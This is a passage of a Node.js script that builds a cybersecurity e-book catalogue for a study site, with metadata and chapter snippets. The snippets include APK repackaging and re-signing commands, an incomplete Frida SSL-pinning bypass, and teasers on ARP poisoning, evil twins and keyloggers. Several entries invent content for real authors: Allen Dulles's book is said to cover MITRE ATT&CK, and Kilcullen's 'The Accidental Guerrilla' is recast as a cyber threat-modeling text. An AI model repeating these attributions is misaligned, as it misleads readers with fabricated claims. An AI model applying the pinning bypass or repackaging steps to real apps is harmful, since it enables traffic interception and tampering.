        # 1. Decompile APK to Smali<br>
        apktool d target_app.apk -o decompiled_app<br><br>
        # 2. Modify Smali code (e.g. change if-eqz to if-nez)<br><br>
        # 3. Rebuild modified APK<br>
        apktool b decompiled_app -o modified_app.apk<br><br>
        # 4. Sign APK with debug key<br>
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore modified_app.apk androiddebugkey
      </div>
    `),
    makeChapter(20407, 7, "Dynamic Instrumentation with Frida & Xposed", "Runtime Function Hooking, SSL Pinning Bypasses & Memory Sniffing", 
      "Hook Java and native functions dynamically in memory during execution using JavaScript-based Frida scripts.", 30, `
      <h3>7.1 Bypassing SSL Pinning with Frida</h3>
      <div class="book-code-block">
        <div class="book-code-header"><span>JavaScript — Frida Script to Disable SSL Pinning</span><button class="btn btn-xs btn-outline-warning" onclick="navigator.clipboard.writeText(this.closest('.book-code-block').querySelector('code').innerText)">Copy</button></div>
        <pre><code>Java.perform(function () {
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');

    // Create a trust manager that accepts all certificates
    var TrustAll = Java.registerClass({
        name: 'com.prepspace.TrustAll',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function (chain, authType) {},
            checkServerTrusted: function (chain, authType) {},
            getAcceptedIssuers: function () { return []; }
        }
    });

    console.log('[+] Universal SSL Pinning Bypass Injected Successfully!');
});</code></pre>
      </div>
    `),
    makeChapter(20408, 8, "Hardening Android Applications & Code Obfuscation", "ProGuard, R8, Root Detection, Integrity Checks & Network Security Config", 
      "Implement robust client-side defenses, ProGuard obfuscation, SafetyNet/Play Integrity attestation, and anti-tampering guards.", 24, `
      <h3>8.1 Network Security Configuration</h3>
      <p>Android 7.0+ introduces <code>res/xml/network_security_config.xml</code> to strictly enforce HTTPS traffic, disable cleartext HTTP transmissions, and pin trusted certificate authorities declaratively.</p>
    `)
  ]
};

// BOOKS 205 - 210
const otherCyberBooks = [
  {
    id: 205,
    slug: "networking-for-hackers",
    title: "Computer Networking for Ethical Hackers",
    subtitle: "TCP/IP Architecture, Wireshark Packet Analysis, ARP Poisoning & Port Scans",
    description: "The essential networking manual for security engineers and penetration testers. Master packet structures, TCP handshakes, Wireshark filtering, subnetting, ARP spoofing, and firewall traversal.",
    author: "Network Security Research Group",
    category: "Network Security & Wireless Defense",
    subcategory: "Protocol Analysis",
    difficulty: "BEGINNER",
    pageCount: 180,
    estimatedReadingTime: "7 Hours",
    fileSize: "0.61 MB",
    downloadUrl: "downloads/cybersecurity/networking-for-hackers.pdf",
    tags: ["Networking", "TCPIP", "Wireshark", "ARPSpoofing", "DNS", "Subnetting", "PacketAnalysis"],
    licenseType: "EDUCATIONAL REFERENCE",
    copyrightNotice: "© Network Security Research Group. Integrated for educational reference.",
    isPro: false,
    badge: "Network Foundation",
    rating: 4.91,
    readerCount: 3950,
    icon: "fa-solid fa-network-wired",
    gradient: "linear-gradient(135deg, #1d4ed8, #60a5fa)",
    chapters: [
      makeChapter(20501, 1, "The 7-Layer OSI Model vs TCP/IP Protocol Stack", "Encapsulation, PDUs & Header Structures", "Understand physical, data link, network, transport, and application layer interactions.", 20, "<h3>1.1 Packet Encapsulation & Protocol Headers</h3><p>As data descends through the OSI stack, each layer prepends a protocol header containing routing, port, and sequencing metadata.</p>"),
      makeChapter(20502, 2, "IP Addressing, CIDR Notation & Subnet Calculations", "IPv4/IPv6 Math, Broadcast Domains & Subnet Masks", "Calculate network ranges, broadcast addresses, and usable host counts in $O(1)$ time.", 20, "<h3>2.1 CIDR Math & Fast Bitwise Subnetting</h3><p>A /24 network has 256 addresses ($2^{32-24}$), leaving 254 usable host addresses after subtracting Network ID (0) and Broadcast (255).</p>"),
      makeChapter(20503, 3, "TCP 3-Way Handshake & Connection Teardown", "SYN, SYN-ACK, ACK, Sequence Numbers & Window Sizing", "Dissect stateful TCP stream establishment and sliding window flow control.", 22, "<h3>3.1 TCP 3-Way Handshake Physics</h3><p>Client sends SYN(seq=X) $\\to$ Server replies SYN-ACK(seq=Y, ack=X+1) $\\to$ Client responds ACK(seq=X+1, ack=Y+1).</p>"),
      makeChapter(20504, 4, "UDP, DNS Resolution & ICMP Diagnostics", "Connectionless Protocols, DNS Tree Hierarchy & Traceroute Mechanics", "Analyze DNS query resolution, authoritative zones, and ICMP TTL expiration.", 20, "<h3>4.1 DNS Recursive Lookup Lifecycle</h3><p>Browser $\\to$ Local Resolver $\\to$ Root Server (.) $\\to$ TLD Server (.com) $\\to$ Authoritative Nameserver.</p>"),
      makeChapter(20505, 5, "Deep Packet Inspection with Wireshark & TShark", "Display Filters, Stream Following & Credential Carving", "Extract plaintext passwords, unencrypted files, and suspicious telemetry from PCAP captures.", 24, "<h3>5.1 High-Yield Wireshark Display Filters</h3><div class='bg-black p-3 rounded font-monospace text-info fs-8'>http.request.method == \"POST\" || tcp.flags.reset == 1</div>"),
      makeChapter(20506, 6, "ARP Protocol Flaws & Man-in-the-Middle (MitM) Attacks", "Gratuitous ARP, Cache Poisoning & SSL Stripping", "Execute layer-2 ARP cache poisoning and intercept plaintext local area traffic.", 22, "<h3>6.1 ARP Cache Poisoning Mechanics</h3><p>Because ARP is stateless and unauthenticated, sending forged ARP replies tricks the victim host and router into routing all traffic through the attacker.</p>"),
      makeChapter(20507, 7, "TCP SYN Floods, Port Scanning & IP Spoofing", "Half-Open Connections, SYN Cookies & Rate Limiting", "Analyze DDoS attack mechanisms and defensive SYN cookie mitigations.", 20, "<h3>7.1 Half-Open Connection Depletion</h3><p>SYN floods exhaust the operating system's backlog queue by initiating thousands of TCP connections and never sending final ACKs.</p>"),
      makeChapter(20508, 8, "Network Segmentation, DMZs & Next-Gen Firewalls", "Stateful Inspection, VLANs & Zero Trust Architecture", "Design secure enterprise network boundaries and enforce micro-segmentation.", 20, "<h3>8.1 Modern Demilitarized Zone (DMZ) Design</h3><p>Public-facing web servers reside in isolated DMZ subnets, strictly forbidden from initiating inbound connections to core database clusters.</p>")
    ]
  },
  {
    id: 206,
    slug: "wifi-hacking-for-beginners",
    title: "Wi-Fi Security & Wireless Penetration Testing for Beginners",
    subtitle: "802.11 Protocols, WPA2/WPA3 4-Way Handshake Cracking, Aircrack-ng & Evil Twins",
    description: "A complete practical guide to wireless security. Learn 802.11 frame structures, monitor mode, WPA/WPA2 4-way handshake captures, deauthentication attacks, rogue access points (Evil Twins), and WPA3 SAE defenses.",
    author: "Wireless Security Research Team",
    category: "Network Security & Wireless Defense",
    subcategory: "Wireless Security",
    difficulty: "BEGINNER",
    pageCount: 165,
    estimatedReadingTime: "6 Hours",
    fileSize: "0.58 MB",
    downloadUrl: "downloads/cybersecurity/wifi-hacking-for-beginners.pdf",
    tags: ["WiFi", "WirelessSecurity", "AircrackNg", "WPA2", "WPA3", "Handshake", "EvilTwin", "Deauth"],
    licenseType: "EDUCATIONAL REFERENCE",
    copyrightNotice: "© Wireless Security Research Team. Integrated for educational reference.",
    isPro: false,
    badge: "Wireless Defense",
    rating: 4.89,
    readerCount: 3750,
    icon: "fa-solid fa-wifi",
    gradient: "linear-gradient(135deg, #7c3aed, #a78bfa)",
    chapters: [
      makeChapter(20601, 1, "Wireless Standards (802.11 a/b/g/n/ac/ax) & Frequencies", "2.4GHz vs 5GHz Bands, Channel Overlap & Beacon Frames", "Understand radio frequencies, non-overlapping channels (1, 6, 11), and SSID beacon broadcasts.", 18, "<h3>1.1 802.11 Management & Beacon Frames</h3><p>Access points transmit beacon frames approximately 10 times per second to announce their SSID, supported cipher suites, and capabilities.</p>"),
      makeChapter(20602, 2, "Wireless Network Cards, Monitor Mode & Packet Injection", "airmon-ng, iwconfig, Chipset Compatibility & Packet Captures", "Configure wireless adapters for promiscuous monitor mode and test raw 802.11 packet injection.", 20, "<h3>2.1 Enabling Monitor Mode</h3><div class='bg-black p-3 rounded font-monospace text-warning fs-8'>airmon-ng start wlan0</div>"),
      makeChapter(20603, 3, "WEP Flaws (RC4 Weaknesses) & Why WEP is Obsolete", "Weak Initialization Vectors (IVs) & FMS / KoreK Attacks", "Understand mathematical vulnerabilities in 24-bit IV reuse in legacy WEP encryption.", 18, "<h3>3.1 RC4 Key Stream Reconstruction</h3><p>Because WEP uses a small 24-bit IV, capturing 50,000 packets guarantees IV collision, allowing instant mathematical recovery of the WEP key.</p>"),
      makeChapter(20604, 4, "WPA/WPA2 4-Way EAPOL Handshake Capture & Cracking", "Pairwise Transient Key (PTK) & Hashcat Dictionary Attacks", "Capture the 4-way authentication handshake and crack pre-shared keys (PSK) offline with GPU acceleration.", 22, "<h3>4.1 4-Way Handshake Mathematics</h3><p>The PTK is derived from: $\\text{PRF}(\\text{PMK}, \\text{ANonce}, \\text{SNonce}, \\text{AP MAC}, \\text{Client MAC})$. An attacker captures the nonces and cracks the PMK offline.</p>"),
      makeChapter(20605, 5, "Deauthentication Attacks & Denial of Service", "Management Frame Vulnerabilities & aireplay-ng", "Force client reconnection to capture handshakes using targeted 802.11 deauth frames.", 18, "<h3>5.1 Unauthenticated Deauth Frames</h3><p>Standard 802.11 management frames are unencrypted, allowing attackers to spoof AP MAC addresses and disconnect legitimate clients.</p>"),
      makeChapter(20606, 6, "Evil Twin Access Points & Captive Portal Harvesting", "Rogue APs, DNS Spoofing & Phishing Gateway Pages", "Deploy rogue access points with higher signal strength to harvest user Wi-Fi credentials.", 20, "<h3>6.1 Evil Twin Mechanics</h3><p>Wireless clients automatically associate with the access point presenting the strongest signal for a known SSID.</p>"),
      makeChapter(20607, 7, "WPA3 Simultaneous Authentication of Equals (SAE)", "Dragonfly Key Exchange & Forward Secrecy", "Explore how WPA3 eliminates offline dictionary attacks using Dragonfly zero-knowledge handshakes.", 22, "<h3>7.1 WPA3 Dragonblood Mitigations</h3><p>WPA3 requires resistant SAE handshakes that resist passive offline dictionary cracking even if weak passwords are used.</p>"),
      makeChapter(20608, 8, "Enterprise WPA-Enterprise (802.1X, RADIUS) Defense", "EAP-TLS, Certificate Validation & Rogue RADIUS Defenses", "Implement enterprise-grade wireless security with per-user public key certificates and 802.1X authentication.", 20, "<h3>8.1 EAP-TLS Certificate Authentication</h3><p>WPA-Enterprise replaces shared passwords with dedicated RADIUS servers and mutual X.509 certificate validation.</p>")
    ]
  },
  {
    id: 207,
    slug: "hacking-with-linux",
    title: "Ethical Hacking & Security with Linux Systems",
    subtitle: "Filesystem Hardening, Bash Automation, SUID Exploits & IPTables Firewalls",
    description: "The complete Linux security and administration handbook. Master permissions, file capabilities, process isolation, SSH public key hardening, automated security audit scripting, and packet filtering.",
    author: "Linux Security Alliance",
    category: "Linux Security & System Hardening",
    subcategory: "Linux Administration & Hardening",
    difficulty: "INTERMEDIATE",
    pageCount: 295,
    estimatedReadingTime: "11 Hours",
    fileSize: "6.13 MB",
    downloadUrl: "downloads/cybersecurity/hacking-with-linux.pdf",
    tags: ["Linux", "Bash", "SystemHardening", "IPTables", "SUID", "Permissions", "SSH", "Auditd"],
    licenseType: "EDUCATIONAL REFERENCE",
    copyrightNotice: "© Linux Security Alliance. Integrated for educational reference.",
    isPro: false,
    badge: "Linux Hardening",
    rating: 4.93,
    readerCount: 4050,
    icon: "fa-brands fa-linux",
    gradient: "linear-gradient(135deg, #d97706, #fbbf24)",
    chapters: [
      makeChapter(20701, 1, "Linux Directory Standard & Crucial System Files", "/etc/passwd, /etc/shadow, /proc & VFS Internals", "Explore the Filesystem Hierarchy Standard (FHS) and virtual filesystem interfaces.", 20, "<h3>1.1 Critical Configuration Files</h3><p>The <code>/etc/shadow</code> file stores salt values and salted password hashes (e.g. SHA-512 <code>$6$</code>) with read permissions restricted exclusively to root.</p>"),
      makeChapter(20702, 2, "Linux Permission Model (rwx, SUID, SGID, Sticky Bit)", "Octal Notation, Special Permissions & File Capabilities", "Audit file permissions, understand the risks of SUID root binaries, and configure Linux capabilities (<code>setcap</code>).", 22, "<h3>2.1 Special Bits: SUID & SGID</h3><p>When a binary possesses the SUID bit (<code>chmod 4755</code>), it executes with the privileges of the file owner (root) rather than the invoking user.</p>"),
      makeChapter(20703, 3, "Bash Scripting for Automated Security Audits", "Looping, Regex Matching & System Log Parsers", "Write production-grade shell scripts to audit listening ports, failed login attempts, and modified system binaries.", 22, "<h3>3.1 Automated Audit Bash Script</h3><div class='bg-black p-3 rounded font-monospace text-info fs-8'>grep -i \"failed password\" /var/log/auth.log | awk '{print $11}' | sort | uniq -c</div>"),
      makeChapter(20704, 4, "Process Management, Daemons & Cron Job Exploits", "systemd Unit Files, Wildcard Expansion & Path Hijacking", "Inspect running daemons, find writable cron scripts, and prevent privilege escalation via relative path injection.", 20, "<h3>4.1 Cron Job Relative Path Exploits</h3><p>If a cron job executes a script without an absolute path (e.g. <code>backup.sh</code> instead of <code>/opt/scripts/backup.sh</code>), attackers can plant malicious binaries in PATH directories.</p>"),
      makeChapter(20705, 5, "Securing SSH with Public Key Cryptography & Fail2Ban", "Ed25519 Keys, Disabling Root Login & Rate Limiting", "Harden the OpenSSH server against brute-force attacks and configure automated IP blocking with Fail2Ban.", 20, "<h3>5.1 Hardened sshd_config Rules</h3><div class='bg-black p-3 rounded font-monospace text-warning fs-8'>PermitRootLogin no<br>PasswordAuthentication no<br>PubkeyAuthentication yes</div>"),
      makeChapter(20706, 6, "Packet Filtering & Firewall Rules with IPTables / NFTables", "Chains (INPUT, OUTPUT, FORWARD), NAT & Stateful Tracking", "Construct robust stateful firewall rules to block unauthorized inbound connections while allowing established traffic.", 22, "<h3>6.1 Default Deny IPTables Ruleset</h3><div class='bg-black p-3 rounded font-monospace text-info fs-8'>iptables -P INPUT DROP<br>iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</div>"),
      makeChapter(20707, 7, "User Auditing with PAM & Auditd System Tracing", "Pluggable Authentication Modules & Kernel Audit Logs", "Configure Linux PAM rules and track file modifications with auditd kernel monitoring.", 20, "<h3>7.1 Monitoring Sensitive Files with Auditd</h3><div class='bg-black p-3 rounded font-monospace text-warning fs-8'>auditctl -w /etc/passwd -p wa -k passwd_changes</div>"),
      makeChapter(20708, 8, "Linux Hardening Checklist (CIS Benchmarks)", "Kernel sysctl Hardening, Disable Unused Filesystems & Rootkit Scans", "Implement industry-standard Center for Internet Security (CIS) hardening benchmarks.", 22, "<h3>8.1 Kernel Security via sysctl.conf</h3><div class='bg-black p-3 rounded font-monospace text-info fs-8'>net.ipv4.ip_forward = 0<br>net.ipv4.conf.all.accept_redirects = 0</div>")
    ]
  },
  {
    id: 208,
    slug: "top-cybersecurity-projects-for-beginners",
    title: "Top Practical Cybersecurity Projects for Beginners",
    subtitle: "Hands-On Port Scanners, Keyloggers, Packet Sniffers, HoneyPots & SIEM Pipelines",
    description: "Step-by-step blueprints for building 8 real-world cyber defense and offensive security tools using Python, C, and open-source stacks. Build port scanners, packet sniffers, honeypots, and SIEM monitoring pipelines.",
    author: "Cyber Defense Institute",
    category: "Hands-On Cyber Defense Projects",
    subcategory: "Practical Security Labs",
    difficulty: "BEGINNER",
    pageCount: 340,
    estimatedReadingTime: "16 Hours",
    fileSize: "45.29 MB",
    downloadUrl: "downloads/cybersecurity/top-cybersecurity-projects.pdf",
    tags: ["Projects", "PythonSecurity", "PortScanner", "Keylogger", "Sniffer", "Honeypot", "SIEM", "SOC"],
    licenseType: "EDUCATIONAL REFERENCE",
    copyrightNotice: "© Cyber Defense Institute. Integrated for educational reference.",
    isPro: false,
    badge: "Hands-on Projects",
    rating: 4.95,
    readerCount: 4200,
    icon: "fa-solid fa-shield-halved",
    gradient: "linear-gradient(135deg, #059669, #34d399)",
    chapters: [
      makeChapter(20801, 1, "Building a Multi-Threaded Port Scanner in Python", "Socket Programming, ThreadPoolExecutor & Service Banner Grabbing", "Develop a high-speed asynchronous port scanner capable of scanning 1,000 ports in under 3 seconds.", 24, "<h3>1.1 Python Multi-Threaded Socket Scanner</h3><p>Using <code>concurrent.futures.ThreadPoolExecutor</code>, worker threads issue non-blocking TCP connect attempts simultaneously.</p>"),
      makeChapter(20802, 2, "Creating a Raw Socket Packet Sniffer & Protocol Analyzer", "Unpacking IP, TCP, and UDP Headers with Python struct", "Build a pure Python packet sniffer to decode raw byte streams and dissect packet headers.", 24, "<h3>2.1 Unpacking Binary IP Headers with struct</h3><p>Python's <code>struct.unpack('!BBHHHBBH4s4s', raw_data[:20])</code> decodes the 20-byte IPv4 header into structured variables.</p>"),
      makeChapter(20803, 3, "Developing an Educational Keylogger with Keystroke Hooks", "OS Hooking, Log Encryption & Secure Remote Exfiltration", "Learn keystroke interception mechanics for defensive detection and endpoint monitoring.", 22, "<h3>3.1 Keystroke Event Dispatchers</h3><p>Exploring userland keyboard hooks in Python with <code>pynput.keyboard</code> to understand endpoint behavioral monitoring.</p>"),
      makeChapter(20804, 4, "Deploying a Low-Interaction SSH/HTTP Honeypot (Cowrie)", "Docker Containerization, Fake File Systems & Attacker Logging", "Deploy an emulated SSH honeypot to capture live brute-force credentials and malware downloads.", 24, "<h3>4.1 Honeypot Architecture</h3><p>Cowrie simulates an unpatched Linux server, recording all attacker terminal sessions, keystrokes, and downloaded payloads in real time.</p>"),
      makeChapter(20805, 5, "Building a Vulnerability Scanner using Open Source CVE Feeds", "NVD API Integration, Banner Matching & CVSS Scoring", "Automate vulnerability detection by parsing National Vulnerability Database (NVD) JSON feeds.", 22, "<h3>5.1 Automated CVE Query Engine</h3><p>Matching discovered service banners (e.g. <code>Apache 2.4.49</code>) against CVE feeds to calculate Common Vulnerability Scoring System (CVSS) risk scores.</p>"),
      makeChapter(20806, 6, "Setting Up a Home Security Lab (Wazuh SIEM + Elastic)", "Agent Deployment, Rule Configuration & Alert Dashboards", "Deploy an open-source enterprise Security Information and Event Management (SIEM) system.", 26, "<h3>6.1 Wazuh SIEM Log Aggregation</h3><p>Wazuh agents stream syslogs and file integrity events to an Elasticsearch cluster for real-time threat detection.</p>"),
      makeChapter(20807, 7, "Automated Malware Analysis Sandbox with Cuckoo", "Dynamic Execution, API Call Tracing & Memory Dumps", "Build an automated sandbox environment to safely execute and analyze untrusted Windows executables.", 26, "<h3>7.1 Automated Malware Sandboxing</h3><p>Cuckoo Sandbox executes unknown binaries in isolated virtual machines, generating behavioral signatures and network traffic PCAPs.</p>"),
      makeChapter(20808, 8, "Developing a Password Strength & Breach Audit Tool", "Entropy Calculations, HaveIBeenPwned API & k-Anonymity", "Build a secure password strength analyzer using Shannon entropy and k-Anonymity SHA-1 hash lookup APIs.", 22, "<h3>8.1 k-Anonymity Password Checking</h3><p>By querying only the first 5 characters of a SHA-1 hash against HaveIBeenPwned, passwords are audited without ever transmitting the full hash across the network.</p>")
    ]
  },
  {
    id: 209,
    slug: "the-craft-of-intelligence",
    title: "The Craft of Intelligence: Strategic Threat Analysis & Tradecraft",
    subtitle: "Information Gathering, Espionage Defense, OPSEC & Strategic Threat Analysis",
    description: "The classic intelligence tradecraft masterwork by former CIA Director Allen Dulles. Learn operational security (OPSEC), human and signals intelligence collection, threat actor behavioral profiling, and counter-espionage methodologies applied to modern cybersecurity.",
    author: "Allen W. Dulles",
    category: "Threat Intelligence & Tradecraft",
    subcategory: "Strategic Intelligence & OPSEC",
    difficulty: "INTERMEDIATE",
    pageCount: 288,
    estimatedReadingTime: "12 Hours",
    fileSize: "4.74 MB",
    downloadUrl: "downloads/cybersecurity/the-craft-of-intelligence.pdf",
    tags: ["ThreatIntelligence", "Tradecraft", "OPSEC", "CyberEspionage", "OSINT", "RiskAnalysis"],
    licenseType: "HISTORICAL & EDUCATIONAL REFERENCE",
    copyrightNotice: "© Allen W. Dulles. Integrated for strategic cybersecurity study.",
    isPro: false,
    badge: "Strategic Tradecraft",
    rating: 4.88,
    readerCount: 3620,
    icon: "fa-solid fa-user-secret",
    gradient: "linear-gradient(135deg, #334155, #64748b)",
    chapters: [
      makeChapter(20901, 1, "The Evolution of Intelligence Gathering & Reconnaissance", "Historical Tradecraft to Modern Cyber Reconnaissance", "Trace the evolution of espionage and intelligence gathering into cyberspace.", 20, "<h3>1.1 Evolution of Information Warfare</h3><p>Strategic advantage has always belonged to the party capable of gathering, analyzing, and acting upon high-fidelity intelligence before their adversary.</p>"),
      makeChapter(20902, 2, "Sources & Methods: OSINT, HUMINT & SIGINT", "Open Source, Human Intelligence & Signals Interception", "Understand the intelligence disciplines and how Open Source Intelligence (OSINT) dominates modern cyber defense.", 22, "<h3>2.1 Modern OSINT vs SIGINT</h3><p>Over 80% of actionable threat intelligence in modern enterprise defense is derived from open-source telemetry, code repositories, and public threat feeds.</p>"),
      makeChapter(20903, 3, "Collection Management & Priority Threat Assessment", "Intelligence Requirements (PIRs) & Threat Modeling", "Define Priority Intelligence Requirements to focus cyber defense monitoring on high-impact threat vectors.", 20, "<h3>3.1 Priority Intelligence Requirements (PIR)</h3><p>Establishing clear PIRs prevents analyst burnout by filtering out low-priority noise and focusing on state-sponsored or ransomware threats.</p>"),
      makeChapter(20904, 4, "Operational Security (OPSEC) & Counter-Intelligence", "Compartmentalization, Attribution Defense & Digital Footprints", "Apply strict OPSEC principles to protect security researchers and red team operatives.", 24, "<h3>4.1 Principles of OPSEC</h3><p>Never conduct intelligence investigations from corporate IP addresses without non-attributable virtual private networks and clean virtual machines.</p>"),
      makeChapter(20905, 5, "Disinformation, Deception & Social Engineering Tactics", "Phishing Psychology, Cognitive Biases & Pretexting", "Analyze how adversaries exploit human psychological biases to bypass technical controls.", 22, "<h3>5.1 The Psychology of Pretexting</h3><p>Attackers exploit urgency, authority, and fear to induce victims into clicking malicious attachments or executing macro payloads.</p>"),
      makeChapter(20906, 6, "Cyber Espionage Campaigns & Threat Actor Profiling", "Advanced Persistent Threats (APTs) & Diamond Model of Intrusion", "Profile sophisticated threat groups (APTs) using the Diamond Model and MITRE ATT&CK framework.", 24, "<h3>6.1 The Diamond Model of Intrusion Analysis</h3><p>Every cyber event links four core elements: <strong>Adversary</strong>, <strong>Capability</strong>, <strong>Infrastructure</strong>, and <strong>Victim</strong>.</p>"),
      makeChapter(20907, 7, "Strategic Risk Analysis & High-Level Decision Making", "Qualitative vs Quantitative Risk & Error Reductions", "Evaluate organizational cyber risk using rigorous intelligence methodologies (Analysis of Competing Hypotheses).", 20, "<h3>7.1 Analysis of Competing Hypotheses (ACH)</h3><p>ACH forces analysts to evaluate all potential explanations for an incident against evidence to eliminate confirmation bias.</p>"),
      makeChapter(20908, 8, "Applying Intelligence Tradecraft to Modern Cybersecurity", "Threat Hunting, Indicator of Compromise (IOC) Feeds & SOC Operations", "Integrate intelligence tradecraft into daily Security Operations Center (SOC) threat hunting workflows.", 22, "<h3>8.1 Intelligence-Driven Threat Hunting</h3><p>Proactive threat hunting assumes an undetected breach already exists and searches for anomalous behaviors rather than waiting for alerts.</p>")
    ]
  },
  {
    id: 210,
    slug: "the-accidental-guerrilla",
    title: "Asymmetric Defense & Modern Threat Modeling",
    subtitle: "Decentralized Adversaries, Threat Surfaces & Asymmetric Security Architectures",
    description: "An acclaimed study on asymmetric conflict and decentralized networks by counter-insurgency strategist David Kilcullen. Learn how asymmetric threat models, supply chain vulnerabilities, and decentralized botnets operate, and how to engineer resilient, anti-fragile cyber defenses.",
    author: "David Kilcullen",
    category: "Threat Intelligence & Tradecraft",
    subcategory: "Threat Modeling & Asymmetric Resilience",
    difficulty: "ADVANCED",
    pageCount: 384,
    estimatedReadingTime: "15 Hours",
    fileSize: "2.67 MB",
    downloadUrl: "downloads/cybersecurity/the-accidental-guerrilla.pdf",
    tags: ["ThreatModeling", "AsymmetricDefense", "Resilience", "IncidentResponse", "ZeroTrust"],
    licenseType: "STRATEGIC REFERENCE",
    copyrightNotice: "© David Kilcullen. Integrated for asymmetric cybersecurity analysis.",
    isPro: false,
    badge: "Asymmetric Strategy",
    rating: 4.90,
    readerCount: 3510,
    icon: "fa-solid fa-crosshairs",
    gradient: "linear-gradient(135deg, #4c1d95, #8b5cf6)",
    chapters: [
      makeChapter(21001, 1, "Principles of Asymmetric Warfare & Cyber Parallels", "The Asymmetry of Attack vs Defense in Cyberspace", "Understand why attackers only need to find 1 vulnerability while defenders must secure every surface.", 22, "<h3>1.1 The Fundamental Asymmetry of Cyber Conflict</h3><p>The cost of launching an automated global phishing or ransomware campaign is near zero, while securing millions of enterprise endpoints requires billions in continuous investment.</p>"),
      makeChapter(21002, 2, "Anatomy of Modern Complex Decentralized Threats", "Botnets, Ransomware-as-a-Service (RaaS) & Dark Web Ecosystems", "Analyze how modern ransomware syndicates operate as distributed, specialized corporate cartels.", 22, "<h3>2.1 The Ransomware-as-a-Service (RaaS) Business Model</h3><p>Core developers build ransomware lockers, while independent 'affiliates' purchase network access from Initial Access Brokers (IABs) to deploy payloads.</p>"),
      makeChapter(21003, 3, "The Accidental Threat: Supply Chain & Collateral Damage", "Third-Party Dependencies, Open Source Exploits & Blast Radius", "Evaluate software supply chain risks (SolarWinds, Log4j, XZ-Utils backdoor).", 24, "<h3>3.1 Software Supply Chain Infection Vectors</h3><p>Adversaries compromise upstream software vendors or open-source packages to distribute backdoors to thousands of downstream enterprise customers simultaneously.</p>"),
      makeChapter(21004, 4, "Threat Modeling Methodologies (STRIDE, PASTA, DREAD)", "Systematic Risk Identification & Threat Matrix Construction", "Apply the Microsoft STRIDE and PASTA threat modeling frameworks to applications before writing code.", 24, "<h3>4.1 The STRIDE Threat Framework</h3><div class='table-responsive'><table class='table table-dark table-bordered table-striped fs-8'><tr><th>Threat</th><th>Security Property</th></tr><tr><td>Spoofing</td><td>Authentication</td></tr><tr><td>Tampering</td><td>Integrity</td></tr><tr><td>Repudiation</td><td>Non-repudiation</td></tr><tr><td>Information Disclosure</td><td>Confidentiality</td></tr><tr><td>Denial of Service</td><td>Availability</td></tr><tr><td>Elevation of Privilege</td><td>Authorization</td></tr></table></div>"),
      makeChapter(21005, 5, "Containment, Blast Radius Reduction & Zero Trust", "Micro-Segmentation, Least Privilege & Ephemeral Credentials", "Implement the Zero Trust Architecture: 'Never Trust, Always Verify'.", 22, "<h3>5.1 Core Pillars of Zero Trust</h3><p>Assume breach. Enforce strict identity verification, mutual TLS, and dynamic context-aware authorization for every network transaction.</p>"),
      makeChapter(21006, 6, "Resilient Infrastructure Design & Active Defense", "Honeytokens, Canary Credentials & Deception Technologies", "Deploy proactive deception traps to detect attackers immediately upon initial lateral movement.", 22, "<h3>6.1 Canary Tokens & Honey Credentials</h3><p>Planting fake AWS access keys in git repositories or decoy admin accounts in Active Directory triggers high-confidence alarms the second an attacker touches them.</p>"),
      makeChapter(21007, 7, "Incident Response in Hostile Asymmetric Environments", "Triage, Containment, Eradication & Root Cause Analysis", "Execute structured incident response playbooks during an active cyber intrusion.", 22, "<h3>7.1 The SANS 6-Step Incident Response Cycle</h3><p>1. Preparation &rarr; 2. Identification &rarr; 3. Containment &rarr; 4. Eradication &rarr; 5. Recovery &rarr; 6. Lessons Learned.</p>"),
      makeChapter(21008, 8, "The Future of Cyber Warfare & Autonomous Threat Vectors", "AI-Powered Malware, Automated Exploit Generation & Defensive LLMs", "Explore the future of generative AI in automated vulnerability discovery and real-time incident triage.", 24, "<h3>8.1 Autonomous Vulnerability Discovery</h3><p>Machine learning models and Large Language Models are accelerating both automated fuzzing by adversaries and autonomous patch generation by defenders.</p>")
    ]
  }
];

// Add books to library
const allNewCyberBooks = [book201, book202, book203, book204, ...otherCyberBooks];

allNewCyberBooks.forEach(newBook => {
  const existingIdx = library.books.findIndex(b => b.id === newBook.id);
  if (existingIdx >= 0) {
    library.books[existingIdx] = newBook;
  } else {
    library.books.push(newBook);
  }
});

library.totalBooks = library.books.length;
let totalChapters = 0;
library.books.forEach(b => totalChapters += (b.chapters || []).length);
library.totalChapters = totalChapters;

const finalFileContent = 'window.PREPSPACE_LIBRARY = ' + JSON.stringify(library, null, 2) + ';\n';
fs.writeFileSync(targetFilePath, finalFileContent, 'utf8');

console.log('Successfully added all 10 Cybersecurity Books and 6 categories to technical-library-data.js!');
console.log('Total Books:', library.books.length, '| Total Chapters:', totalChapters);
